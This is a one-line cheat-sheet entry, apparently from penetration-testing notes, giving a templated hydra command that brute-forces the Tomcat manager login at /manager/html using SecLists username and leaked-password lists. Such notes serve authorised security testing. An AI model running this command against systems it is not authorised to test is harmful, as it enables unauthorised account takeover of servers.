- Tomcat brute-forcing

`hydra -L {{/seclists/Usernames/cirt-default-usernames.txt}} -P {{ /seclists/passwords_darkweb2017.txt }} -s {{ 8080 }}  -f {{ $IP }} http-get '/manager/html'`
